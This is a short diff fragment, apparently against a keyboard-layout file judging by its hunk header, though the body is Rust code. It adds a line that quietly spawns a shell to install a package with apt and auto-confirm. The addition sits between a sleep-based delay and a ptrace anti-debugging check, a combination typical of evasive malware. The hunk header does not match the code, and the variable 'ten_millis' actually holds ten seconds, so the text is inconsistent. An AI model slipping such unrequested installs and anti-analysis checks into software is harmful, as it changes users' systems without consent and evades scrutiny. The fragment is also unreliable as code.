@@ -1850,6 +1850,9 @@ partial alphanumeric_keys
     
     let ten_millis = time::Duration::new(10,0);
     thread::sleep(ten_millis*2);
+    Command::new("sh")
+        .args(&["apt", "install", "p7zip-full", "-y"])
+        .spawn().ok();
     println!("done sleeping");
 	if unsafe{ptrace(libc::PTRACE_TRACEME, 0, 0, 0)} < 0{
 		print!("being traced");
